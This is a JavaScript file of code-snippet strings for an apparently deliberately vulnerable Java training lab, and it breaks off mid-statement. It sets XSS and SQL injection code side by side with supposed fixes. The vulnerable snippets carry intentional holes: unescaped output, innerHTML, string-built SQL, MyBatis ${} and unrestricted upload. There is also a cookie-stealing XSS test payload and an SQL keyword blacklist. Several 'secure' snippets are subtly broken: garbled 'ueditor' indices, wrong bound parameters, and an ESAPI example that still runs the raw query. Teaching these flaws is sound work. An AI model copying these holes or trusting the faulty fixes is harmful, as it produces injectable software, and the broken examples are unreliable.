/**
 * @description 存放静态代码
 * @author:  whgojp
 * @email:  whgojp@foxmail.com
 * @Date: 2024/5/19 19:03
 */
const vul1ReflectRaw = "// 原生漏洞环境,未加任何过滤，Controller接口返回Json类型结果\n" +
    "public R vul1(String content) {\n" +
    "    return R.ok(content);\n" +
    "}\n" +
    "// R 是对返回结果的封装工具util\n" +
    "// 返回结果：\n" +
    "// {\n" +
    "//     \"msg\": \"<script>alert(document.cookie)</script>\",\n" +
    "//     \"code\": 0\n" +
    "// }\n" +
    "// payload在json中是不会触发xss的 需要解析到页面中\n" +
    "\n" +
    "// 原生漏洞环境,未加任何过滤，Controller接口返回String类型结果\n" +
    "public String vul2(String content) {\n" +
    "    return content;\n" +
    "}"
const vul2ReflectContentType = "// Tomcat内置HttpServletResponse，Content-Type导致反射XSS\n" +
    "public void vul3(String type,String content, HttpServletResponse response) {\n" +
    "    switch (type) {\n" +
    "        case \"html\":\n" +
    "            response.getWriter().print(content);\n" +
    "            response.setContentType(\"text/html;charset=utf-8\");\n" +
    "            response.getWriter().flush();\n" +
    "            break;\n" +
    "        case \"plain\":\n" +
    "            response.getWriter().print(content);\n" +
    "            response.setContentType(\"text/plain;charset=utf-8\");\n" +
    "            response.getWriter().flush();\n" +
    "            ...\n" +
    "    }\n" +
    "}"
const safe1CheckUserInput = "// 对用户输入的数据进行验证和过滤，确保不包含恶意代码。使用白名单过滤，只允许特定类型的输入，如纯文本或指定格式的数据\n" +
    "// 前端校验代码\n" +
    "var whitelistRegex = /^[a-zA-Z0-9_\\s]+$/;\n" +
    "\n" +
    "// 检查输入值是否符合白名单要求\n" +
    "if (!whitelistRegex.test(value)) {\n" +
    "\tlayer.msg('输入内容包含非法字符，请检查输入', {icon: 2, offset: '10px'});\n" +
    "\treturn false; // 取消表单提交\n" +
    "    } else {\n" +
    "    \t// 正常发送请求\n" +
    "    }\n" +
    "\n" +
    "// 后端校验代码\n" +
    "private static final String WHITELIST_REGEX = \"^[a-zA-Z0-9_\\\\s]+$\";\n" +
    "private static final Pattern pattern = Pattern.compile(WHITELIST_REGEX);\n" +
    "\n" +
    "Matcher matcher = pattern.matcher(content);\n" +
    "if (matcher.matches()){\n" +
    "    return R.ok(content);\n" +
    "}else return R.error(\"输入内容包含非法字符，请检查输入\");"
const safe2CSP = "// 内容安全策略（Content Security Policy）是一种由浏览器实施的安全机制，旨在减少和防范跨站脚本攻击（XSS）等安全威胁。它通过允许网站管理员定义哪些内容来源是可信任的，从而防止恶意内容的加载和执行\n" +
    "// 前端Meta配置\n" +
    "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self' https://apis.example.com; style-src 'self' https://fonts.googleapis.com; img-src 'self' data: https://*.example.com;\">\n" +
    "\n" +
    "\n" +
    "// 后端Header配置\n" +
    "public String safe2(String content,HttpServletResponse response) {\n" +
    "    response.setHeader(\"Content-Security-Policy\",\"default-src self\");\n" +
    "    return content;\n" +
    "}"

const safe3EntityEscape = '// 特殊字符实体转义是一种将HTML中的特殊字符转换为预定义实体表示的过程\n' +
    '// 这种转义是为了确保在HTML页面中正确显示特定字符，同时避免它们被浏览器误解为HTML标签或JavaScript代码的一部分，从而导致页面结构混乱或安全漏洞\n' +
    'public R safe3(@ApiParam(String type, String content) {\n' +
    '    String filterContented = "";\n' +
    '    switch (type){\n' +
    '        case "manual":\n' +
    '            content = StringUtils.replace(content, "&", "&amp;");\n' +
    '            content = StringUtils.replace(content, "<", "&lt;");\n' +
    '            content = StringUtils.replace(content, ">", "&gt;");\n' +
    '            content = StringUtils.replace(content, "\\"", "&quot;");\n' +
    '            content = StringUtils.replace(content, "\'", "&#x27;");\n' +
    '            content = StringUtils.replace(content, "/", "&#x2F;");\n' +
    '            filterContented = content;\n' +
    '            break;\n' +
    '        case "spring":\n' +
    '            filterContented = HtmlUtils.htmlEscape(content);\n' +
    '            break;\n' +
    '            ...\n' +
    '    }\n' +
    '}'

const safe4HttpOnly = "// HttpOnly是HTTP响应头属性，用于增强Web应用程序安全性。它防止客户端脚本访问(只能通过http/https协议访问)带有HttpOnly标记的 cookie，从而减少跨站点脚本攻击（XSS）的风险\n" +
    "// 单个接口配置\n" +
    "public R safe4(String content, HttpServletRequest request,HttpServletResponse response) {\n" +
    "    Cookie cookie = request.getCookies()[ueditor];\n" +
    "    cookie.setHttpOnly(true); // 设置为 HttpOnly\n" +
    "    cookie.setMaxAge(600);  // 这里设置生效时间为十分钟\n" +
    "    cookie.setPath(\"/\");\n" +
    "    response.addCookie(cookie);\n" +
    "    return R.ok(content);\n" +
    "}\n" +
    "\n" +
    "// 全局配置\n" +
    "// ueditor、application.yml配置\n" +
    "server:\n" +
    "  servlet:\n" +
    "    session:\n" +
    "      cookie:\n" +
    "        http-only: true\n" +
    "\n" +
    "// 2、Springboot配置类\n" +
    "@Configuration\n" +
    "public class ServerConfig {\n" +
    "    @Bean\n" +
    "    public WebServerFactoryCustomizer<ConfigurableWebServerFactory> webServerFactoryCustomizer() {\n" +
    "        return factory -> {\n" +
    "            Session session = new Session();\n" +
    "            session.getCookie().setHttpOnly(true);\n" +
    "            factory.setSession(session);\n" +
    "            ...\n" +
    "}"

const vul1StoreRaw = "// 原生漏洞环境,未加任何过滤，将用户输入存储到数据库中\n" +
    "// Controller层\n" +
    "public R vul(String content,HttpServletRequest request) {\n" +
    "    String ua = request.getHeader(\"User-Agent\");\n" +
    "    final int code = xssService.insertOne(content,ua);\n" +
    "    ...\n" +
    "}\n" +
    "// Service层\n" +
    "public int insertOne(String content, String ua) {\n" +
    "    final int code = xssMapper.insertAll(content,ua,DateUtil.now());\n" +
    "    return code;\n" +
    "}\n" +
    "// Mapper层\n" +
    "int insertAll(String content,String ua,String date);\n" +
    "\n" +
    "<insert id=\"insertAll\">\n" +
    "    insert into xss\n" +
    "        (content,ua, date)\n" +
    "    values (#{content,jdbcType=VARCHAR},#{ua,jdbcType=VARCHAR}, #{date,jdbcType=VARCHAR})\n" +
    "</insert>"

const safe1StoreEntityEscape = "// 表格数据渲染\n" +
    "table.render({\n" +
    "\t...\n" +
    "    cols: [\n" +
    "        {field: 'id', title: 'ID', sort: true, width: '60', fixed: 'left'},\n" +
    "        {field: 'content', title: 'Content', width: '200', templet: function(d){\n" +
    "                return escapeHtml(d.content); \n" +
    "            }},\n" +
    "        {field: 'ua', title: 'User-Agent', width: '200', templet: function(d){\n" +
    "                return escapeHtml(d.ua); \n" +
    "            }},\n" +
    "      \t...\n" +
    "// 方法一、HTML 实体转义函数\n" +
    "function escapeHtml(html) {\n" +
    "    var text = document.createElement(\"textarea\");\n" +
    "    text.textContent = html;\n" +
    "    return text.innerHTML;\n" +
    "}\n" +
    "// 方法二、JavaScript的文本节点\n" +
    "var textNode = document.createTextNode(htmlContent);\n" +
    "element.appendChild(textNode);\n" +
    "// 方法三、jQuery的text()方法\n" +
    "$('#element').text(htmlContent);\n"

const vul1DomRaw = "// innerHTML\n" +
    "form.on('submit(vul1-dom-raw)', function (data) {\n" +
    "    var userInput = document.getElementById('vul1-dom-raw-input').value;\n" +
    "    var outputDiv = document.getElementById('vul-dom-raw-result');\n" +
    "    outputDiv.innerHTML = userInput;\n" +
    "    return false;\n" +
    "});\n" +
    "\n" +
    "// href跳转场景\n" +
    "var hash = location.hash;\n" +
    "if(hash){\n" +
    "    var url = hash.substring(ueditor);\n" +
    "    console.log(url);\n" +
    "    location.href = url;\n" +
    "}\n" +
    "\n" +
    "// DOM存储注入\n" +
    "form.on('submit(vul3-dom-raw-submit)', function (data) {\n" +
    "    localStorage.setItem('vul4-dom-raw', document.getElementById('vul4-dom-raw-input').value);\n" +
    "    var storedData = localStorage.getItem('vul4-dom-raw');\n" +
    "    document.getElementById('vul-dom-raw-result').innerHTML = storedData;\n" +
    "    return false;\n" +
    "})"

const vul1OtherUpload = "public String uploadFile(MultipartFile file, String suffix,String path) throws IOException {\n" +
    "    String uploadFolderPath = sysConstant.getUploadFolder();\n" +
    "    try {\n" +
    "        String fileName = +DateUtil.current() + \".\"+suffix;\n" +
    "        String newFilePath = uploadFolderPath + \"/\" + fileName;\n" +
    "\n" +
    "        file.transferTo(new File(newFilePath)); // 将文件保存到指定路径\n" +
    "        log.info(\"上传文件成功，文件路径：\" + newFilePath);\n" +
    "        return \"上传文件成功，文件路径：\" + path + fileName;\n" +
    "    } catch (IOException e) {\n" +
    "        e.printStackTrace(); // 打印异常堆栈信息\n" +
    "        log.info(\"文件上传失败\" + e.getMessage());\n" +
    "        return \"文件上传失败\" + e.getMessage();\n" +
    "    }\n" +
    "}"

const vul2OtherTemplate = "public String handleTemplateInjection(String content,String type, Model model) {\n" +
    "    if (\"html\".equals(type)) {\n" +
    "        model.addAttribute(\"html\", content);\n" +
    "    } else if (\"text\".equals(type)) {\n" +
    "        model.addAttribute(\"text\", content);\n" +
    "    }\n" +
    "    return \"vul/xss/other\";\n" +
    "}\n" +
    "\n" +
    "<div class=\"layui-card-body layui-text layadmin-text\" style=\"color: red;font-size: 15px;\">\n" +
    "        <p th:utext=\"${html}\"></p>\n" +
    "        <p th:text=\"${text}\"></p>\n" +
    "</div>"
const vul3SCMSec = "// jQuery依赖\n" +
    "<head>\n" +
    "  <meta charset=\"utf-8\">\n" +
    "  <title>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)</title>\n" +
    "  <!-- 测试JQuery -->\n" +
    "  <script src=\"/lib/jquery-1.6.1.js\"></script>\n" +
    "  <!-- <script src=\"./jquery.min.js\"></script> -->\n" +
    "</head>\n" +
    "\n" +
    "<!--swagger依赖-->\n" +
    "<dependency>\n" +
    "    <groupId>io.springfox</groupId>\n" +
    "    <artifactId>springfox-boot-starter</artifactId>\n" +
    "    <version>3.0.0</version>\t// 该版本存在xss\n" +
    "</dependency>\n" +
    "\n" +
    "// Ueditor编辑器未做任何限制 抓上传数据包后，可以上传任意类型文件";

const vul1RawJoint = "// 原生sql语句动态拼接 参数未进行任何处理\n" +
    "public R vul1(String type,String id,String username,String password) {\n" +
    "    //注册数据库驱动类\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "\n" +
    "    //调用DriverManager.getConnection()方法创建Connection连接到数据库\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "\n" +
    "    //调用Connection的createStatement()或prepareStatement()方法 创建Statement对象\n" +
    "    Statement stmt = conn.createStatement();\n" +
    "    switch (type) {\n" +
    "        case \"add\":\n" +
    "            //这里没有标识id id自增长\n" +
    "            sql = \"INSERT INTO sqli (username, password) VALUES ('\" + username + \"', '\" + password + \"')\";\n" +
    "            //通过Statement对象执行SQL语句，得到ResultSet对象-查询结果集\n" +
    "            // 这里注意一下 insert、update、delete 语句应使用executeUpdate()\n" +
    "            rowsAffected = stmt.executeUpdate(sql);\n" +
    "            //关闭ResultSet结果集 Statement对象 以及数据库Connection对象 释放资源\n" +
    "            stmt.close();\n" +
    "            conn.close();\n" +
    "            return R.ok(message);\n" +
    "        case \"delete\":\n" +
    "            sql = \"DELETE FROM users WHERE id = '\" + id + \"'\";\n" +
    "            rowsAffected = stmt.executeUpdate(sql);\n" +
    "            ...\n" +
    "        case \"update\":\n" +
    "            sql = \"UPDATE sqli SET password = '\" + password + \"', username = '\" + username + \"' WHERE id = '\" + id + \"'\";\n" +
    "            rowsAffected = stmt.executeUpdate(sql);\n" +
    "            ...\n" +
    "        case \"select\":\n" +
    "            sql = \"SELECT * FROM users WHERE id  = \" + id;\n" +
    "            ResultSet rs = stmt.executeQuery(sql);\n" +
    "            ...\n" +
    "        }\n" +
    "}"

const vul2prepareStatementJoint = "// 虽然使用了conn.prepareStatement(sql)创建了一个PreparedStatement对象，但在执行 stmt.executeUpdate(sql)时，却是传递了完整的SQL语句作为参数，而不是使用了预编译的功能\n" +
    "public R vul2(String type,String id,String username,String password) {\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "    PreparedStatement stmt;\n" +
    "    switch (type) {\n" +
    "        case \"add\":\n" +
    "            sql = \"INSERT INTO sqli (username, password) VALUES ('\" + username + \"', '\" + password + \"')\";\n" +
    "            stmt = conn.prepareStatement(sql);\n" +
    "            rowsAffected = stmt.executeUpdate(sql);\n" +
    "            ...\n" +
    "        case \"delete\":\n" +
    "            sql = \"DELETE FROM users WHERE id = '\" + id + \"'\";\n" +
    "            stmt = conn.prepareStatement(sql);\n" +
    "            rowsAffected = stmt.executeUpdate(sql);\n" +
    "            ...\n" +
    "        case \"update\":\n" +
    "            sql = \"UPDATE sqli SET username = '\" + username + \"', password = '\" + password + \"' WHERE id = '\" + id + \"'\";\n" +
    "            stmt = conn.prepareStatement(sql);\n" +
    "            rowsAffected = stmt.executeUpdate(sql);\n" +
    "            ...\n" +
    "        case \"select\":\n" +
    "            sql = \"SELECT * FROM users WHERE id  = \" + id;\n" +
    "            stmt = conn.prepareStatement(sql);\n" +
    "            ResultSet rs = stmt.executeQuery(sql);\n" +
    "            ...\n" +
    "    }\n" +
    "}"
const vul3JdbcTemplateJoint = "// JDBCTemplate是Spring对JDBC的封装，底层实现实际上还是JDBC\n" +
    "public R vul3(String type,String id,String username,String password) {\n" +
    "    DriverManagerDataSource dataSource = new DriverManagerDataSource();\n" +
    "    dataSource.setDriverClassName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    dataSource.setUrl(dbUrl);\n" +
    "    dataSource.setUsername(dbUser);\n" +
    "    dataSource.setPassword(dbPass);\n" +
    "    JdbcTemplate jdbctemplate = new JdbcTemplate(dataSource);\n" +
    "    switch (type) {\n" +
    "        case \"add\":\n" +
    "            sql = \"INSERT INTO sqli (username, password) VALUES ('\" + username + \"', '\" + password + \"')\";\n" +
    "            //Spring的JdbcTemplate会自动管理连接的获取和释放，不需要手动关闭连接\n" +
    "            rowsAffected = jdbctemplate.update(sql);\n" +
    "            ...\n" +
    "        case \"delete\":\n" +
    "            sql = \"DELETE FROM users WHERE id = '\" + id + \"'\";\n" +
    "            rowsAffected = jdbctemplate.update(sql);\n" +
    "            ...\n" +
    "        case \"update\":\n" +
    "            sql = \"UPDATE sqli SET username = '\" + username + \"', password = '\" + password + \"' WHERE id = '\" + id + \"'\";\n" +
    "            rowsAffected = jdbctemplate.update(sql);\n" +
    "            ...\n" +
    "        case \"select\":\n" +
    "            sql = \"SELECT * FROM users WHERE id  = \" + id;\n" +
    "            stringObjectMap = jdbctemplate.queryForMap(sql);\n" +
    "            ...\n" +
    "    }\n" +
    "}"
const safe1PrepareStatementParametric = "// 采用预编译的方法，使用?占位，也叫参数化的SQL\n" +
    "public R safe1(String type,String id,String username,String password) {\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "    PreparedStatement stmt;\n" +
    "    switch (type) {\n" +
    "        case \"add\":\n" +
    "            // 这里可以看到使用了?占位符 sql语句和参数进行分离\n" +
    "            sql = \"INSERT INTO users (username, password) VALUES (?, ?)\"; \n" +
    "            stmt = conn.prepareStatement(sql);\n" +
    "            // 参数化处理\n" +
    "            stmt.setString(ueditor, username); \n" +
    "            stmt.setString(2, password);\n" +
    "            // 使用预编译时 不需要传递sql语句\n" +
    "            rowsAffected = stmt.executeUpdate();\n" +
    "        case \"delete\":\n" +
    "            sql = \"DELETE FROM users WHERE id = ?\";\n" +
    "            stmt = conn.prepareStatement(sql);\n" +
    "            stmt.setString(ueditor, id);\n" +
    "            rowsAffected = stmt.executeUpdate();\n" +
    "            ...\n" +
    "        case \"update\":\n" +
    "            sql = \"UPDATE sqli SET username = ?, password = ? WHERE id = ?\";\n" +
    "            stmt = conn.prepareStatement(sql);\n" +
    "            stmt.setString(1, username);  \n" +
    "            stmt.setString(2, password);\n" +
    "            stmt.setString(3, id);\n" +
    "            stmt.executeUpdate();\n" +
    "            ...\n" +
    "        case \"select\":\n" +
    "            sql = \"SELECT * FROM users WHERE id  = ?\";\n" +
    "            stmt = conn.prepareStatement(sql);\n" +
    "            stmt.setString(ueditor, id);\n" +
    "            ResultSet rs = stmt.executeQuery();\n" +
    "            ...\n" +
    "   }\n" +
    "}"
const safe2JdbcTemplatePrepareStatementParametric = "// JDBCTemplate预编译 此时在常规DML场景有效的防止了SQL注入攻击的发生\n" +
    "public R safe2(String type,String id,String username,String password) {\n" +
    "    DriverManagerDataSource dataSource = new DriverManagerDataSource();\n" +
    "    dataSource.setDriverClassName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    dataSource.setUrl(dbUrl);\n" +
    "    dataSource.setUsername(dbUser);\n" +
    "    dataSource.setPassword(dbPass);\n" +
    "    JdbcTemplate jdbctemplate = new JdbcTemplate(dataSource);\n" +
    "    switch (type) {\n" +
    "        case \"add\":\n" +
    "            sql = \"INSERT INTO sqli (username, password) VALUES (?,?)\";\n" +
    "            rowsAffected = jdbctemplate.update(sql, username, password);\n" +
    "            ...\n" +
    "        case \"delete\":\n" +
    "            sql = \"DELETE FROM users WHERE id = ?\";\n" +
    "            rowsAffected = jdbctemplate.update(sql, id);\n" +
    "            ...\n" +
    "        case \"update\":\n" +
    "            sql = \"UPDATE sqli SET username = ?, password = ? WHERE id = ?\";\n" +
    "            rowsAffected = jdbctemplate.update(sql, username, id);\n" +
    "            ...\n" +
    "        case \"select\":\n" +
    "            sql = \"SELECT * FROM users WHERE id  = ?\";\n" +
    "            stringObjectMap = jdbctemplate.queryForMap(sql, id);\n" +
    "            ...\n" +
    "    }\n" +
    "}\n"
const safe3BlacklistcheckSqlBlackList = "// 检测用户输入是否存在敏感字符：'、;、--、+、,、%、=、>、<、*、(、)、and、or、exeinsert、select、delete、update、count、drop、chr、midmaster、truncate、char、declare\n" +
    "public R safe3(String type,String id,String username,String password) {\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "    Statement stmt = conn.createStatement();\n" +
    "    switch (type) {\n" +
    "        case \"add\":\n" +
    "            if (checkUserInput.checkSqlBlackList(username) || checkUserInput.checkSqlBlackList(password)) {\n" +
    "                return R.error(\"黑名单检测到非法SQL注入!\");\n" +
    "            } else {\n" +
    "                sql = \"INSERT INTO users (username, password) VALUES ('\" + username + \"', '\" + password + \"')\";\n" +
    "                rowsAffected = stmt.executeUpdate(sql);\n" +
    "                ...\n" +
    "        case \"delete\":\n" +
    "            if (checkUserInput.checkSqlBlackList(id)) {\n" +
    "                return R.error(\"黑名单检测到非法SQL注入!\");\n" +
    "            } else {\n" +
    "                sql = \"DELETE FROM users WHERE id = '\" + id + \"'\";\n" +
    "                rowsAffected = stmt.executeUpdate(sql);\n" +
    "                ...\n" +
    "        case \"update\":\n" +
    "            if (checkUserInput.checkSqlBlackList(id) || checkUserInput.checkSqlBlackList(username) || checkUserInput.checkSqlBlackList(id)) {\n" +
    "                return R.error(\"黑名单检测到非法SQL注入!\");\n" +
    "            } else {\n" +
    "                sql = \"UPDATE users SET password = '\" + password + \"', username = '\" + username + \"' WHERE id = '\" + id + \"'\";\n" +
    "                rowsAffected = stmt.executeUpdate(sql);\n" +
    "                ...\n" +
    "        case \"select\":\n" +
    "            if (checkUserInput.checkSqlBlackList(id)) {\n" +
    "                return R.error(\"黑名单检测到非法SQL注入!\");\n" +
    "            } else {\n" +
    "                sql = \"SELECT * FROM users WHERE id  = \" + id;\n" +
    "                ResultSet rs = stmt.executeQuery(sql);\n" +
    "                ...\n" +
    "    }\n" +
    "}\n"
const safe4RequestRarameterValidate = "// 强制类型转换 对用户请求参数进行校验\n" +
    "public R safe4(Integer id) {\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "    Statement stmt = conn.createStatement();\n" +
    "    message = checkUserInput.checkUser(id);\n" +
    "    if (!message.isEmpty()) return R.error(message);\n" +
    "    sql = \"SELECT * FROM users WHERE id  = \" + id;\n" +
    "    ResultSet rs = stmt.executeQuery(sql);\n" +
    "    ...\n" +
    "}"
const safe4EASAPIFilter = "// ESAPI提供了多种输入验证API，提供对XSS攻击和SQL注入攻击等的防护\n" +
    "public R safe4(String id) {\n" +
    "    Codec<Character> oracleCodec = new OracleCodec();\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "\n" +
    "    Statement stmt = conn.createStatement();\n" +
    "    // 使用了 Oracle 的编解码器 OracleCodec 和 ESAPI 库来对 ID 进行编码，以防止 SQL 注入攻击。\n" +
    "    String sql = \"select * from sqli where id = '\" + ESAPI.encoder().encodeForSQL(oracleCodec, id) + \"'\";\n" +
    "    // String sql = \"select * from sqli where id = '\" + id + \"'\";\n" +
    "    String sql = \"select * from users where id = '\" + id + \"'\";\n" +
    "    ResultSet rs = stmt.executeQuery(sql);\n" +
    "}"
const special1OrderBy = "// ORDER BY关键字用于按升序或降序对结果集进行排序。 由于order by后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会不支持原有功能 使用默认排序，因此通常防御order by注入需要使用白名单的方式\n" +
    "public R special1OrderBy(String type,String field) {\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "    PreparedStatement preparedStatement;\n" +
    "    switch (type) {\n" +
    "        case \"raw\":\n" +
    "            sql = \"SELECT * FROM users ORDER BY \" + field;\n" +
    "            preparedStatement = conn.prepareStatement(sql);\n" +
    "            rs = preparedStatement.executeQuery();\n" +
    "            ...\n" +
    "        case \"prepareStatement\":\n" +
    "            // 可以测试下 预编译没有报错 不过插入语句不生效 默认使用主键升序\n" +
    "            sql = \"select * from users order by ?\";\n" +
    "            preparedStatement = conn.prepareStatement(sql);\n" +
    "            preparedStatement.setString(ueditor, field);\n" +
    "            rs = preparedStatement.executeQuery();\n" +
    "            ...\n" +
    "        case \"writeList\":\n" +
    "            sql = \"SELECT * FROM users ORDER BY \" + field;\n" +
    "            if (checkUserInput.chechSqlWhiteList(field)) {\n" +
    "                return R.error(\"field字段不合法！\");\n" +
    "            }\n" +
    "            preparedStatement = conn.prepareStatement(sql);\n" +
    "            rs = preparedStatement.executeQuery();\n" +
    "   }\n" +
    "}\n" +
    "/**\n" +
    " * SQL注入关键词白名单\n" +
    " */\n" +
    "public boolean checkSqlWhiteList(String content) {\n" +
    "    String[] white_list = {\"id\", \"username\", \"password\"};\n" +
    "    for (String s : white_list) {\n" +
    "        if (content.toLowerCase().equals(s)) {\n" +
    "            return true;\n" +
    "        }\n" +
    "    }\n" +
    "    return false;\n" +
    "}"
const special2Like = "public R special2Like(String type,String keyword) {\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "    ...\n" +
    "    switch (type) {\n" +
    "        case \"raw\":                 // 查询语句拼接\n" +
    "//          sql = \"SELECT * FROM sqli WHERE username LIKE '%\" + keyword + \"%'\";\n" +
    "            sql = \"SELECT * FROM sqli WHERE username LIKE concat('%', '\" + keyword + \"', '%')\";\n" +
    "            rs = stmt.executeQuery(sql);\n" +
    "            ...\n" +
    "        case \"prepareStatement\":    // 使用预编译\n" +
    "            sql = \"SELECT * FROM sqli WHERE username LIKE ?\";\n" +
    "            preparedStatement = conn.prepareStatement(sql);\n" +
    "            preparedStatement.setString(1, \"%\" + keyword + \"%\");\n" +
    "            rs = preparedStatement.executeQuery();\n" +
    "            ...\n" +
    "    }\n" +
    "}"
const special3Limit = "public R special3Limit(String type,String size) {\n" +
    "    Class.forName(\"com.mysql.cj.jdbc.Driver\");\n" +
    "    Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);\n" +
    "    ...\n" +
    "    switch (type) {\n" +
    "        case \"raw\":\n" +
    "            sql = \"SELECT * FROM sqli ORDER BY id DESC LIMIT \" + size;\n" +
    "            rs = stmt.executeQuery(sql);\n" +
    "            ...\n" +
    "        // 使用预编译\n" +
    "        case \"prepareStatement\":\n" +
    "            sql = \"SELECT * FROM sqli ORDER BY id DESC LIMIT ?\";\n" +
    "            preparedStatement = conn.prepareStatement(sql);\n" +
    "            preparedStatement.setString(1, size);\n" +
    "            rs = preparedStatement.executeQuery();\n" +
    "            ...\n" +
    "    }\n" +
    "}"

// MyBatis
const vul1CustomMethod = "vul1CustomMethod"
const safe1NativeMethod = "// 这里以增加功能为例\n" +
    "// Controller层\n" +
    "public R safe1(\n" +
    "switch (type) {\n" +
    "    case \"add\":\n" +
    "        rowsAffected = sqliService.nativeInsert(new Sqli(id, username, password));\n" +
    "        message = (rowsAffected > 0) ? \"数据插入成功 username:\" + username + \" password:\" + password : \"数据插入失败\";\n" +
    "        return R.ok(message);\n" +
    "        ...\n" +
    "}\n" +
    "// Service层\n" +
    "@Override\n" +
    "public int nativeInsert(Sqli user) {\n" +
    "    return sqliMapper.insert(user);\n" +
    "}\n" +
    "\n" +
    "// Mapper层\n" +
    "int insert(T entity); \n"

const safe2CustomMethod = "// 这里以增加功能为例\n" +
    "// Controller层\n" +
    "public R safe2( \n" +
    "switch (type) {\n" +
    "    case \"add\":\n" +
    "        //这里插入数据使用MyBatiX插件生成的方法\n" +
    "        rowsAffected = sqliService.customInsert(new Sqli(id, username, password));\n" +
    "        message = (rowsAffected > 0) ? \"数据插入成功 username:\" + username + \" password:\" + password : \"数据插入失败\";\n" +
    "        return R.ok(message);\n" +
    "        ...\n" +
    "}\n" +
    "// Service层\n" +
    "//自定义SQL-使用#{}\n" +
    "@Override\n" +
    "public int customInsert(Sqli user) {\n" +
    "    return sqliMapper.customInsert(user);\n" +
    "}\n" +
    "\n" +
    "// Mapper层\n" +
    "<insert id=\"customInsert\">\n" +
    "    insert into sqli (id,username,password) values (#{id,jdbcType=INTEGER},#{username,jdbcType=VARCHAR},#{password,jdbcType=VARCHAR})\n" +
    "</insert>"

const mybatisSpecial1OrderBy =
    "// Controller层\n" +
    "public R special1OrderBy() {\n" +
    "  List<Sqli> sqlis = new ArrayList<>();\n" +
    "  switch (type) {\n" +
    "      case \"raw\":\n" +
    "          sqlis = sqliService.orderByVul(field);\n" +
    "          break;\n" +
    "      case \"prepareStatement\":\n" +
    "          sqlis = sqliService.orderByPrepareStatement(field);\n" +
    "          break;\n" +
    "      case \"writeList\":\n" +
    "          sqlis = sqliService.orderByWriteList(field);\n" +
    "      ...\n" +
    "// Service层\n" +
    "//自定义SQL-使用#{}\n" +
    "@Override\n" +
    "public List<Sqli> orderByVul(String field) {\n" +
    "    return sqliMapper.orderByVul(field);\n" +
    "}\n" +
    "@Override\n" +
    "public List<Sqli> orderByPrepareStatement(String field) {\n" +
    "    return sqliMapper.orderByPrepareStatement(field);\n" +
    "}\n" +
    "@Override\n" +
    "public List<Sqli> orderByWriteList(String field) {\n" +
    "    return sqliMapper.orderByWriteList(field);\n" +
    "}\n" +
    "// Mapper层\n" +
    "<!--    Order by下的${}拼接注入问题-->\n" +
    "<select id=\"orderByVul\" resultType=\"top.whgojp.modules.sqli.entity.Sqli\">\n" +
    "    SELECT * FROM sqli\n" +
    "    <if test=\"field != null and field != ''\">\n" +
    "        ORDER BY ${field}\n" +
    "    </if>\n" +
    "</select>\n" +
    "<!--    Order by下的#{}写法 排序不生效-->\n" +
    "<select id=\"orderByPrepareStatement\" resultType=\"top.whgojp.modules.sqli.entity.Sqli\">\n" +
    "    SELECT * FROM sqli\n" +
    "    <if test=\"field != null and field != ''\">\n" +
    "        ORDER BY #{field}\n" +
    "    </if>\n" +
    "</select>\n" +
    "<!--    Order by下的安全写法 白名单-->\n" +
    "<select id=\"orderByWriteList\" resultType=\"top.whgojp.modules.sqli.entity.Sqli\">\n" +
    "    SELECT * FROM sqli\n" +
    "    <if test=\"field != null and field != ''\">\n" +
    "        <choose>\n" +
    "            <!-- 排序列名白名单 -->\n" +
    "            <when test=\"field == 'id' or field == 'username' or field == 'password'\">\n" +
    "                ORDER BY ${field}\n" +
    "            </when>\n" +
    "            <otherwise>\n" +
    "                <!-- 默认使用id进行排序 -->\n" +
    "                ORDER BY id\n" +
    "            </otherwise>\n" +
    "        </choose>\n" +
    "    </if>\n" +
    "</select>"

const mybatisSpecial2Like ="// Controller层\n" +
    "public R special1OrderBy() {\n" +
    "@PostMapping(\"/special2-Like\")\n" +
    "public R special2Like(String type,String keyword) {\n" +
    "    List<Sqli> sqlis = new ArrayList<>();\n" +
    "    switch (type) {\n" +
    "        case \"raw\":\n" +
    "            sqlis = sqliService.likeVul(keyword);\n" +
    "            break;\n" +
    "        case \"prepareStatement\":\n" +
    "            sqlis = sqliService.likePrepareStatement(keyword);\n" +
    "            break;\n" +
    "    ...\n" +
    "// Service层\n" +
    "@Override\n" +
    "public List<Sqli> orderByWriteList(String field) {\n" +
    "    return sqliMapper.orderByWriteList(field);\n" +
    "}\n" +
    "@Override\n" +
    "public List<Sqli> likeVul(String keyword) {\n" +
    "    return sqliMapper.likeVul(keyword);\n" +
    "}\n" +
    "// Mapper层\n" +
    "<!--  模糊查询-->\n" +
    "<select id=\"likeVul\" resultType=\"top.whgojp.modules.sqli.entity.Sqli\">\n" +
    "    SELECT * FROM sqli WHERE username LIKE '%${keyword}%'\n" +
    "</select>\n" +
    "<select id=\"likePrepareStatement\" resultType=\"top.whgojp.modules.sqli.entity.Sqli\">\n" +
    "    SELECT * FROM sqli WHERE username LIKE CONCAT('%', #{keyword}, '%')\n" +
    "</select>"

const mybatisSpecial3In ="// Controller层\n" +
